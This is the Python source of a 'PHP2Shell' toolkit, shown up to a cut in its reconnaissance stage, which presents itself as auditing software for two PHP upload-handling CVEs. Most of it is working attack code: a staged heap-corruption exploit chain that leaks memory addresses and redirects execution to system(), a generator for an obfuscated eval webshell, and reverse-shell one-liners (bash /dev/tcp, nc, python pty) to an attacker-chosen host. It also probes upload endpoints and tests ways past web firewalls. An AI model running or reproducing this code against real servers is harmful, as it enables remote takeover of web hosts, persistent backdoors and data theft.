#!/usr/bin/env python3
"""
PHP2Shell Toolkit (v2.2.1)
==========================

All-in-one defensive auditing and weaponized exploitation suite for
CVE-2026-109618 (RFC 1867 Multipart OOM Memory Corruption) and
CVE-2026-109619 (Stale Global State Use-After-Free).

Features:
  - Single HTTP request shared across passive version audit and runtime header analysis.
  - Unified WAF signature dictionary across recon and active evasion testing.
  - Comprehensive PHP endpoint wordlist for discovery and multi-endpoint fallback.
  - Unified RFC 1867 multipart builder.
  - Step-by-step real-time progress reporting across the entire pipeline:
      [1/5] Reconnaissance (Endpoints, WAF, CMS, CT Subdomains)
      [2/5] Passive Fingerprinting (Version risk table, SAPI mode)
      [3/5] Active Behavioral Probing (Differential OOM & Session UAF probes)
      [4/5] WAF Evasion Analysis (Chunked transfer, boundary tricks, IP spoofing)
      [5/5] Weaponized Exploitation (Exploit-DB #52704 & Webshell Dropper)
      [Shell] Live Interactive Console / Reverse Shell
"""

from __future__ import annotations

import argparse
import base64
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from enum import Enum
import ipaddress
import json
import logging
import os
from pathlib import Path
import random
import re
import socket
import ssl
import string
import struct
import sys
import threading
import time
from typing import Any, Dict, List, Optional, Sequence, Set, Tuple
import urllib.parse
from urllib.parse import urljoin, urlparse

import requests

# Safe console colors
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    class _NoOp:
        def __getattr__(self, _: str) -> str:
            return ""
    Fore = _NoOp()  # type: ignore
    Style = _NoOp()  # type: ignore

# Windows stream safety
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
if hasattr(sys.stderr, "reconfigure"):
    try:
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

logger = logging.getLogger("php2shell")

__version__ = "2.2.1"

# ---------------------------------------------------------------------------
# UNIFIED CONSTANTS (Single Source of Truth)
# ---------------------------------------------------------------------------

BANNER = rf"""
{Fore.CYAN}
  ____  _   _ ____  ____  ____  _          _ _
 |  _ \| | | |  _ \|___ \/ ___|| |__   ___| | |
 | |_) | |_| | |_) | __) \___ \| '_ \ / _ \ | |
 |  __/|  _  |  __/ / __/ ___) | | | |  __/ | |
 |_|   |_| |_|_|   |_____|____/|_| |_|\___|_|_|
                     {Fore.YELLOW}Toolkit v{__version__}
{Style.RESET_ALL}
   {Fore.WHITE}PHP Vulnerability & Weaponized Exploitation Pipeline{Style.RESET_ALL}
   {Fore.WHITE}Recon → Passive → Behavioral Probing → WAF → Exploit → Shell{Style.RESET_ALL}
   {Fore.WHITE}CVE-2026-109618 | CVE-2026-109619 (CVSS 9.2 RCE){Style.RESET_ALL}
   {Fore.RED}[Exploit-DB #52704 & UAF Stale State Integration]{Style.RESET_ALL}
   -------------------------------------------------------------
"""

# Tracked CVEs
TRACKED_CVES = [
    "CVE-2026-109618",  # OOM Uninitialized Memory Corruption (CVSS 9.2)
    "CVE-2026-109619",  # Stale Global State Use-After-Free (CVSS 9.2)
]

# Minimum Patched Version per branch
PATCHED_VERSIONS: Dict[Tuple[int, int], Tuple[int, int, int]] = {
    (8, 2): (8, 2, 35),
    (8, 3): (8, 3, 36),
    (8, 4): (8, 4, 27),
    (8, 5): (8, 5, 12),
}

# Unified WAF Signatures (Combined from recon and waf_detector)
UNIFIED_WAF_SIGNATURES: Dict[str, List[str]] = {
    "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
    "AWS WAF": ["x-amzn-requestid", "x-amzn-trace-id", "x-amz-cf-id", "x-amzn-waf-action"],
    "Akamai": ["akamai-origin-hop", "x-check-cacheable", "akamai", "akamai-ghost", "x-akamai-request-id"],
    "ModSecurity": ["mod_security", "modsec", "mod-security", "modsecurity"],
    "Imperva": ["x-iinfo", "incap_ses", "visid_incap", "imperva"],
    "F5 BIG-IP ASM": ["bigipserver", "f5", "ts01", "ts_", "x-wa-info"],
    "Barracuda": ["barra_counter_session", "barracuda"],
    "Sucuri": ["x-sucuri-id", "sucuri"],
    "Wordfence": ["wordfence", "wfwaf"],
    "Fortinet FortiWeb": ["fortiwafsid", "fortigate"],
}

# Unified CMS Signatures
UNIFIED_CMS_PATTERNS: Dict[str, List[str]] = {
    "WordPress": ["wp-content", "wp-includes", "/wp-json/", "WordPress"],
    "Joomla": ["/administrator/", "joomla", "Joomla"],
    "Drupal": ["x-drupal-cache", "Drupal.settings", "drupal"],
    "Magento": ["/pub/static/", "Mage.Cookies", "PHPSESSID", "magento"],
    "Laravel": ["laravel_session", "x-laravel", "Laravel"],
    "Symfony": ["x-debug-token", "x-symfony", "symfony"],
    "PrestaShop": ["prestashop", "PrestaShop"],
    "OpenCart": ["opencart", "route=common/home"],
}

# Unified Comprehensive PHP Endpoint Wordlist (120+ paths)
UNIFIED_PHP_ENDPOINTS: List[str] = [
    # Primary entry points
    "/index.php",
    "/home.php",
    "/main.php",
    "/app.php",
    "/default.php",
    # File upload vectors (primary targets for CVE-2026-109618/109619)
    "/upload.php",
    "/uploads/",
    "/uploader.php",
    "/upload_file.php",
    "/upload-file.php",
    "/fileupload.php",
    "/file_upload.php",
    "/admin/upload.php",
    "/admin/uploader.php",
    "/admin/upload-file.php",
    "/api/upload",
    "/api/v1/upload",
    "/api/v2/upload",
    "/api/file/upload",
    "/api/files",
    "/ajax/upload.php",
    "/ajax_upload.php",
    "/ajax-upload.php",
    "/handler/upload.php",
    "/handlers/upload.php",
    "/server/php/",
    "/files/upload.php",
    "/media/upload.php",
    "/attachment.php",
    "/attachments.php",
    # Common CMS & Framework endpoints
    "/wp-login.php",
    "/wp-admin/",
    "/wp-admin/admin-ajax.php",
    "/wp-admin/async-upload.php",
    "/wp-content/",
    "/wp-includes/",
    "/xmlrpc.php",
    "/administrator/",
    "/administrator/index.php",
    "/components/",
    "/modules/",
    "/user/login",
    "/core/install.php",
    "/pub/static/",
    # Administration & Control Panels
    "/admin/",
    "/admin/index.php",
    "/admin/login.php",
    "/admin/dashboard.php",
    "/admin/manage.php",
    "/panel/",
    "/panel/index.php",
    "/dashboard.php",
    "/control/",
    "/cpanel/",
    "/manage.php",
    "/portal/",
    "/portal/index.php",
    # Database & Web Management
    "/phpmyadmin/",
    "/phpMyAdmin/",
    "/pma/",
    "/adminer.php",
    "/db.php",
    "/mysql.php",
    "/database.php",
    "/sql.php",
    # Diagnostics & Configuration
    "/phpinfo.php",
    "/info.php",
    "/php_info.php",
    "/test.php",
    "/test_info.php",
    "/i.php",
    "/status.php",
    "/ping.php",
    "/health.php",
    "/check.php",
    "/version.php",
    # APIs, Auth & Processing Handlers
    "/api/",
    "/api/v1/",
    "/login.php",
    "/register.php",
    "/auth.php",
    "/contact.php",
    "/search.php",
    "/file.php",
    "/download.php",
    "/image.php",
    "/img.php",
    "/thumb.php",
    "/thumbnail.php",
    "/resize.php",
    "/proxy.php",
    "/ajax.php",
    "/api.php",
    "/cron.php",
    "/cron/cron.php",
    "/callback.php",
    "/webhook.php",
    "/process.php",
    "/submit.php",
    "/handler.php",
    "/gateway.php",
    "/checkout.php",
    "/cart.php",
    "/account.php",
    "/profile.php",
    "/includes/config.php",
    "/config.php",
    "/configuration.php",
    "/settings.php",
    "/setup.php",
    "/install.php",
    "/update.php",
    "/upgrade.php",
]

SECLISTS_PHP_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Common-PHP-Filenames.txt"

def load_custom_wordlist(file_path: Optional[str] = None, fetch_remote: bool = False, timeout: int = 10) -> List[str]:
    """Loads and returns an enhanced list of PHP endpoints from built-in, local file, or remote GitHub SecLists."""
    endpoints = list(UNIFIED_PHP_ENDPOINTS)

    # 1. Fetch remote SecLists common PHP endpoints if requested
    if fetch_remote:
        try:
            logger.info("Fetching remote SecLists PHP wordlist from GitHub...")
            r = requests.get(SECLISTS_PHP_URL, timeout=timeout)
            if r.status_code == 200:
                remote_count = 0
                for line in r.text.splitlines():
                    p = line.strip()
                    if p and not p.startswith("#"):
                        if not p.startswith("/"):
                            p = f"/{p}"
                        if p not in endpoints:
                            endpoints.append(p)
                            remote_count += 1
                logger.info("Loaded %d additional endpoints from remote SecLists", remote_count)
        except Exception as e:
            logger.warning("Could not fetch remote SecLists wordlist: %s", e)

    # 2. Load custom user wordlist file if provided
    if file_path:
        p_path = Path(file_path)
        if p_path.is_file():
            try:
                user_count = 0
                with open(p_path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        p = line.strip()
                        if p and not p.startswith("#"):
                            if not p.startswith("/"):
                                p = f"/{p}"
                            if p not in endpoints:
                                endpoints.append(p)
                                user_count += 1
                logger.info("Loaded %d custom endpoints from %s", user_count, file_path)
            except Exception as e:
                logger.error("Error reading custom wordlist %s: %s", file_path, e)

    return list(dict.fromkeys(endpoints))

# Exploit-DB #52704 Offsets & Calibration
DEFAULT_ZIF_OFFSET = 0x43A870       # zif_system
DEFAULT_DTOR_OFFSET = 0x613C50      # ZVAL_PTR_DTOR
DEFAULT_HTDATA_OFFSET = 0x6E0D8     # lab build fake HashTable offset
BOOKWORM_HTDATA_OFFSET = 0x690D8    # official php:8.4.26-apache offset
MAX_CMD_LEN = 14
DEFAULT_STAGED_TRIGGER = "sh /tmp/php*"
DEFAULT_SID = b"attacksessionid0001"

BOOKWORM_STAGE1_N = 841
BOOKWORM_STAGE2_T = 406
BOOKWORM_STAGE2_V = 16
BOOKWORM_STAGE3_PADS = [(31, 31)] * 6

DEFAULT_WEBSHELL_NAME = "p2s_shell.php"
DEFAULT_PARAM = "cmd"
PAYLOAD_DELIMITER_START = "===P2S_START==="
PAYLOAD_DELIMITER_END = "===P2S_END==="

TARGET_WRITABLE_PATHS: List[str] = [
    ".",
    "uploads/",
    "upload/",
    "images/",
    "media/",
    "files/",
    "tmp/",
    "/tmp",
    "/var/tmp",
    "/var/www/html/uploads",
    "/var/www/html",
]

# ---------------------------------------------------------------------------
# DATA STRUCTURES & ENUMS
# ---------------------------------------------------------------------------

class PHPRuntime(str, Enum):
    MOD_PHP = "mod_php"
    PHP_FPM = "php-fpm"
    CGI = "cgi"
    LITESPEED = "litespeed"
    UNKNOWN = "unknown"

class VulnerabilityStatus(str, Enum):
    VULNERABLE = "vulnerable"
    VULNERABLE_EOL = "vulnerable_eol"
    PATCHED = "patched"
    UNKNOWN = "unknown"

class ProbeOutcome(str, Enum):
    LIKELY_VULNERABLE = "likely_vulnerable"
    LIKELY_PATCHED = "likely_patched"
    INCONCLUSIVE = "inconclusive"
    ERROR = "error"
    SKIPPED = "skipped"

class WAFBehaviour(str, Enum):
    BLOCKS = "blocks"
    PASSES = "passes"
    RATE_LIMITS = "rate_limits"
    UNKNOWN = "unknown"

class ExploitStatus(str, Enum):
    SUCCESS = "success"
    SHELL_SPAWNED = "shell_spawned"
    WEBSHELL_DROPPED = "webshell_dropped"
    VULNERABLE_TRIGGERED = "vulnerable_triggered"
    UNCONFIRMED = "unconfirmed"
    FAILED = "failed"
    ERROR = "error"

@dataclass
class PHPEndpoint:
    url: str
    status_code: int
    content_length: int
    response_time: float
    is_upload_endpoint: bool = False
    accepts_multipart: bool = False

@dataclass
class ReconResult:
    target: str = ""
    php_endpoints: List[PHPEndpoint] = field(default_factory=list)
    waf_detected: List[str] = field(default_factory=list)
    cms_detected: List[str] = field(default_factory=list)
    subdomains: List[str] = field(default_factory=list)
    robots_paths: List[str] = field(default_factory=list)
    sitemap_paths: List[str] = field(default_factory=list)
    tech_stack: Dict[str, str] = field(default_factory=dict)
    error: Optional[str] = None

    @property
    def best_probe_endpoint(self) -> Optional[str]:
        for ep in self.php_endpoints:
            if ep.is_upload_endpoint:
                return ep.url
        return self.php_endpoints[0].url if self.php_endpoints else None

@dataclass
class VersionResult:
    version_string: Optional[str] = None
    version_tuple: Optional[Tuple[int, int, int]] = None
    source: Optional[str] = None
    status: VulnerabilityStatus = VulnerabilityStatus.UNKNOWN
    applicable_cves: List[str] = field(default_factory=list)
    detail: str = "No PHP version detected."
    phpinfo_exposed: bool = False
    raw_header_value: Optional[str] = None

@dataclass
class HeaderAnalysis:
    target: str = ""
    is_php: bool = False
    confidence: str = "none"
    runtime_mode: PHPRuntime = PHPRuntime.UNKNOWN
    evidence: List[str] = field(default_factory=list)
    php_session_cookie: bool = False
    server_header: Optional[str] = None
    x_powered_by: Optional[str] = None
    extra_headers: Dict[str, str] = field(default_factory=dict)
    error: Optional[str] = None

@dataclass
class ProbeEvidence:
    probe_name: str
    control_status: Optional[int] = None
    probe_status: Optional[int] = None
    control_time: Optional[float] = None
    probe_time: Optional[float] = None
    differential_flag: bool = False
    note: str = ""

@dataclass
class ProbeResult:
    target: str = ""
    outcome: ProbeOutcome = ProbeOutcome.SKIPPED
    evidence: List[ProbeEvidence] = field(default_factory=list)
    detail: str = "No active probe run."
    probes_run: int = 0
    error: Optional[str] = None

@dataclass
class WAFTestResult:
    test_name: str
    behaviour: WAFBehaviour = WAFBehaviour.UNKNOWN
    http_status: Optional[int] = None
    latency: Optional[float] = None
    note: str = ""

@dataclass
class WAFAnalysis:
    target: str = ""
    waf_name: Optional[str] = None
    waf_confidence: str = "none"
    tests: List[WAFTestResult] = field(default_factory=list)
    blocks_probes: bool = False
    bypass_vectors: List[str] = field(default_factory=list)
    summary: str = ""

@dataclass
class ExploitResult:
    target: str = ""
    status: ExploitStatus = ExploitStatus.FAILED
    webshell_url: Optional[str] = None
    webshell_param: str = DEFAULT_PARAM
    command_output: Optional[str] = None
    reverse_shell_connected: bool = False
    details: str = ""
    stage_log: List[str] = field(default_factory=list)

# ---------------------------------------------------------------------------
# SHARED UTILITIES & MULTIPART BUILDERS
# ---------------------------------------------------------------------------

def proof_file_is_fresh(path: str, before: Optional[Tuple[int, int]]) -> bool:
    """True only if local proof file exists and is new or changed since baseline."""
    try:
        stat = os.stat(path)
    except OSError:
        return False
    current = (stat.st_mtime_ns, stat.st_size)
    return before is None or current != before


def parse_php_version(version_str: str) -> Optional[Tuple[int, int, int]]:
    clean = re.sub(r"[-+].*$", "", version_str.strip())
    parts = clean.split(".")
    if len(parts) < 3:
        return None
    try:
        return (int(parts[0]), int(parts[1]), int(parts[2]))
    except ValueError:
        return None

def build_multipart_payload(parts: List[dict], boundary: bytes) -> bytes:
    """Unified RFC 1867 multipart form generator."""
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        data = p["data"].encode() if isinstance(p["data"], str) else p["data"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            fn = p["filename"].encode() if isinstance(p["filename"], str) else p["filename"]
            out += b'; filename="' + fn + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + data + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)

def parse_cookie_from_headers(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))

def chunk_base_from_cookie(raw: bytes) -> int:
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0

def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DEFAULT_DTOR_OFFSET) -> int:
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0

def generate_stealth_webshell(password: Optional[str] = None) -> Tuple[str, str]:
    param = password or "".join(random.choices(string.ascii_lowercase, k=6))
    raw_php = f"""<?php
if(isset($_REQUEST['{param}'])){{
    $c = $_REQUEST['{param}'];
    echo "{PAYLOAD_DELIMITER_START}";
    if(function_exists('system')){{ @system($c); }}
    elseif(function_exists('shell_exec')){{ echo @shell_exec($c); }}
    elseif(function_exists('passthru')){{ @passthru($c); }}
    elseif(function_exists('exec')){{ @exec($c, $o); echo implode("\\n", $o); }}
    elseif(function_exists('popen')){{ $h = @popen($c, 'r'); while(!feof($h)) echo fread($h, 1024); pclose($h); }}
    elseif(function_exists('proc_open')){{
        $p = @proc_open($c, [1=>['pipe','w']], $pipes);
        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        proc_close($p);
    }} else {{ echo "EXEC_DISABLED"; }}
    echo "{PAYLOAD_DELIMITER_END}";
    exit;
}}
?>"""
    b64 = base64.b64encode(raw_php.encode("utf-8")).decode("utf-8")
    return f"<?php @eval(base64_decode('{b64}')); ?>", param

def generate_reverse_shell_cmd(lhost: str, lport: int) -> str:
    return (
        f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' || "
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f || "
        f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")' || "
        f"nc -e /bin/bash {lhost} {lport} || nc -e /bin/sh {lhost} {lport}"
    )

def get_local_ip() -> str:
    """Attempt to detect local IP address for reverse shell listener."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "127.0.0.1"

# ---------------------------------------------------------------------------
# RAW HTTP TRANSPORT FOR BINARY MEMORY CORRUPTION CHAIN
# ---------------------------------------------------------------------------

class RawHttpTarget:
    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = False):
        u = urllib.parse.urlsplit(url)
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        self.timeout = timeout
        self.verbose = verbose

    def _connect(self) -> socket.socket:
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.https:
                    ctx = ssl.create_default_context()
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last or OSError("Connection failed")

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: Optional[float] = None, extra_headers: Optional[Dict[str, str]] = None) -> bytes:
        extra = "".join(f"{k}: {v}\r\n" for k, v in (extra_headers or {}).items())
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode('latin1')}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)
        data = bytearray()

        def _reader():
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass
            reader.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()

    def get(self, path: str, read_cap: int = 1 << 20) -> Tuple[int, bytes]:
        hdr = f"GET {path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\nConnection: close\r\n\r\n".encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            while len(data) < read_cap:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
        except OSError:
            pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body

# ---------------------------------------------------------------------------
# EXPLOIT-DB #52704 BINARY EXPLOIT CHAIN
# ---------------------------------------------------------------------------

class ExploitDB52704Engine:
    def __init__(self, target: RawHttpTarget, cmd: str, zif_offset: int = DEFAULT_ZIF_OFFSET,
                 dtor_offset: int = DEFAULT_DTOR_OFFSET, htdata_offset: Optional[int] = None,
                 huge_mb: int = 12, profile: str = "bookworm",
                 staged_payload: Optional[bytes] = None):
        self.t = target
        self.cmd = cmd.encode("latin1")
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.huge_mb = huge_mb
        self.profile = profile
        self.staged_payload = staged_payload

        if profile == "bookworm":
            self.stage1_n = BOOKWORM_STAGE1_N
            self.stage2_t = BOOKWORM_STAGE2_T
            self.stage2_v = BOOKWORM_STAGE2_V
            self.htdata_offset = htdata_offset if htdata_offset is not None else BOOKWORM_HTDATA_OFFSET
            self.stage3_pads = list(BOOKWORM_STAGE3_PADS)
            self.stage3_carrier = True
        else:
            self.stage1_n = 892
            self.stage2_t = 443
            self.stage2_v = 1
            self.htdata_offset = htdata_offset if htdata_offset is not None else DEFAULT_HTDATA_OFFSET
            self.stage3_pads = [(8, 7)] + [(7, 7)] * 5
            self.stage3_carrier = False

    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        data = self.staged_payload if self.staged_payload is not None else b"A" * 64
        return {"name": "f", "filename": "payload.sh", "data": data}

    def rotate(self) -> None:
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file_part(), self._big_field()]
        self.t.post(build_multipart_payload(parts, b"S" * 17), b"S" * 17, timeout=90.0)
        time.sleep(0.3)
        parts = [{"name": "PHPSESSID", "data": DEFAULT_SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        self.t.post(build_multipart_payload(parts, b"BNDRY12345"), b"BNDRY12345", timeout=20.0)
        time.sleep(0.5)

    def stage1(self) -> int:
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file_part(), self._big_field()]
        self.t.post(build_multipart_payload(parts, b"S" * 17), b"S" * 17, timeout=90.0)
        time.sleep(0.2)
        parts = [{"name": "PHPSESSID", "data": DEFAULT_SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(self.stage1_n):
            parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        resp = self.t.post(build_multipart_payload(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie_from_headers(resp))

    def stage2(self) -> int:
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file_part(), self._big_field()]
        self.t.post(build_multipart_payload(parts, b"S" * 17), b"S" * 17, timeout=90.0)
        time.sleep(0.2)
        parts = [{"name": "PHPSESSID", "data": DEFAULT_SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v})
        resp = self.t.post(build_multipart_payload(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie_from_headers(resp), self.dtor_offset)

    def _fake_payload(self, htdata: int, zif: int) -> Tuple[bytes, bytes]:
        cmd = self.cmd
        if len(cmd) > MAX_CMD_LEN:
            raise ValueError(f"Cmd ({len(cmd)}B) > {MAX_CMD_LEN}B carrier limit")
        ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x10, zif)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int) -> None:
        parts = [{"name": "PHPSESSID", "data": b"a" * 19}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3}]
        for i, (nl, vl) in enumerate(self.stage3_pads):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = {"Cookie": "PHPSESSID=" + "a" * 32} if self.profile == "bookworm" else None
        self.t.post(build_multipart_payload(parts, b"S" * 17), b"S" * 17, extra_headers=extra, timeout=90.0)
        time.sleep(0.3)

        ht, ref = self._fake_payload(htdata, zif)
        parts = [{"name": "PHPSESSID", "data": DEFAULT_SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        if self.stage3_carrier:
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(build_multipart_payload(parts, b"B" * 10), b"B" * 10, timeout=30.0)

# ---------------------------------------------------------------------------
# PIPELINE STAGES (UNIFIED EXECUTION WITH ZERO DUPLICATES)
# ---------------------------------------------------------------------------

class UnifiedPHP2Shell:
    """Consolidated pipeline engine with step-by-step reporting."""

    def __init__(self, session: Optional[requests.Session] = None, timeout: int = 10, verbose: bool = False):
        self.timeout = timeout
        self.verbose = verbose
        self.session = session or requests.Session()
        self.session.headers.update({"User-Agent": f"PHP2Shell/{__version__} (Security Research)"})
        # Leave HTTPS certificate verification enabled by default.

    def progress(self, step: str, msg: str, colour: str = Fore.CYAN) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] {colour}{step}{Style.RESET_ALL} {msg}", file=sys.stderr, flush=True)

    # -----------------------------------------------------------------------
    # STAGE 1: Reconnaissance
    # -----------------------------------------------------------------------
    def run_recon(
        self,
        target: str,
        subdomain_enum: bool = False,
        custom_endpoints: Optional[List[str]] = None,
        max_endpoints: int = 150,
    ) -> ReconResult:
        self.progress("[1/5 RECON]", f"Probing target architecture and attack surface: {target}")
        result = ReconResult(target=target)
        base = target.rstrip("/")

        # Fingerprint Root
        try:
            r = self.session.get(f"{base}/", timeout=self.timeout, allow_redirects=True)
            hdr_str = " ".join(f"{k}={v}" for k, v in r.headers.items()).lower()
            body_lower = r.text.lower()

            for waf_name, sigs in UNIFIED_WAF_SIGNATURES.items():
                if any(s.lower() in hdr_str or s.lower() in body_lower for s in sigs):
                    if waf_name not in result.waf_detected:
                        result.waf_detected.append(waf_name)

            for cms_name, sigs in UNIFIED_CMS_PATTERNS.items():
                if any(s.lower() in hdr_str or s.lower() in body_lower for s in sigs):
                    if cms_name not in result.cms_detected:
                        result.cms_detected.append(cms_name)

            for h in ["Server", "X-Powered-By", "X-Drupal-Cache", "X-WordPress"]:
                if h in r.headers:
                    result.tech_stack[h] = r.headers[h]
        except Exception as e:
            result.error = str(e)
            return result

        if result.waf_detected:
            self.progress("  └─ WAF:", f"Detected: {', '.join(result.waf_detected)}", Fore.YELLOW)
        if result.cms_detected:
            self.progress("  └─ CMS:", f"Detected: {', '.join(result.cms_detected)}", Fore.MAGENTA)

        # Harvest robots.txt
        try:
            rb = self.session.get(f"{base}/robots.txt", timeout=self.timeout, allow_redirects=False)
            if rb.status_code == 200:
                for line in rb.text.splitlines():
                    if line.lower().startswith(("allow:", "disallow:")):
                        p = line.split(":", 1)[1].strip()
                        if p.endswith(".php") or "/php" in p.lower():
                            result.robots_paths.append(p)
        except Exception:
            pass

        # Harvest sitemap.xml
        for sm_path in ["/sitemap.xml", "/sitemap_index.xml"]:
            try:
